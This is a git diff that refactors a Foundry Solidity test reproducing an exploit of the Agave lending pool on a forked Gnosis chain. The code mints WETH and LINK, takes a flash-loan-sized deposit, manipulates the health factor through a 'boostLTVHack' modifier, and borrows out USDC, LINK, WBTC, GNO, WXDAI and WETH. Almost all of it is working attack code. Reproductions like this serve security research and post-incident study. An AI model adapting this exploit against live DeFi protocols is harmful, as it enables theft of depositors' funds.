@@ -44,9 +44,9 @@ contract AgaveExploit is Test {
     //Prepare numbers
     uint256 linkLendNum1 = 1_000_000_000_000_000_100;
     uint256 wethlendnum2 = 1;
-    uint256 linkDebt3 = 700_000_000_000_000_000;
+    uint256 linkDebt3 = 0.7 ether;
     uint256 wethDebt4 = 1;
-    uint256 linkWithdraw5 = 66_666_666_660_000_000;
+    uint256 linkWithdraw5 = 0.06666666666 ether;
 
     uint256 callCount = 0;
     uint256 wethLiqBeforeHack = 0;
@@ -69,14 +69,21 @@ contract AgaveExploit is Test {
     IGnosisBridgedAsset LINK = IGnosisBridgedAsset(link);
 
     // Contract / exchange interfaces
-    ILendingPoolAddressesProvider providerAddrs;
     ILendingPool lendingPool;
 
     uint256 ethFlashloanAmt = 2730 ether;
+
     modifier balanceLog() {
         _logBalances("Before hack balances");
         _;
         _logBalances("After hack balances");
+    }
+
+    modifier boostLTVHack() {
+        lendingPool.deposit(weth, WETH.balanceOf(address(this)) - 1, address(this), 0);
+        _;
+        //We borrow directly here cause of some edge case the _borrow fails for weth
+        lendingPool.borrow(weth, wethLiqBeforeHack, 2, 0, address(this));
     }
 
     function _getTokenBal(address asset) internal view returns (uint256) {
@@ -96,18 +103,14 @@ contract AgaveExploit is Test {
         console.log("--- End of balances ---");
     }
 
-
     function setUp() public {
         vm.createSelectFork("gnosis", 21_120_283); //fork gnosis at block number 21120319
-        providerAddrs = ILendingPoolAddressesProvider(provider);
-        lendingPool = ILendingPool(providerAddrs.getLendingPool());
-        console.log(providerAddrs.getPriceOracle());
+        lendingPool = ILendingPool(ILendingPoolAddressesProvider(provider).getLendingPool());
+        wethLiqBeforeHack = _getAvailableLiquidity(weth);
         //Lets just mint weth to this contract for initial debt
         vm.startPrank(tokenOwner);
-        wethLiqBeforeHack = _getAvailableLiquidity(weth);
         //Mint initial weth funding
-        WETH.mint(address(this), 2728.934387414251504146 ether);
-        WETH.mint(address(this), 1);
+        WETH.mint(address(this), 2728.934387414251504146 ether + 1);
         // Mint LINK funding
         LINK.mint(address(this), linkLendNum1);
         vm.stopPrank();
@@ -150,7 +153,6 @@ contract AgaveExploit is Test {
         lendingPool.withdraw(link, linkWithdraw5, address(this));
     }
 
-
     function testExploit() public balanceLog {
         //Call prepare and get it setup
         _initHF();
@@ -184,15 +186,13 @@ contract AgaveExploit is Test {
         if (BorrowAmount > 0) lendingPool.borrow(asset, BorrowAmount, 2, 0, address(this));
     }
 
-    function borrowTokens() internal {
-        lendingPool.deposit(weth, WETH.balanceOf(address(this)) - 1, address(this), 0);
+    //NOTE: boostLTVHack deposits weth from flashloan to increase health and borrows wethliqbeforehack at the end
+    function borrowTokens() internal boostLTVHack {
         _borrow(usdc);
         _borrow(link);
         _borrow(wbtc);
         _borrow(gno);
         _borrow(wxdai);
-        //We borrow directly here cause of some edge case the _borrow fails for weth
-        lendingPool.borrow(weth, wethLiqBeforeHack, 2, 0, address(this));
     }
 
     function onTokenTransfer(address _from, uint256 _value, bytes memory _data) external {
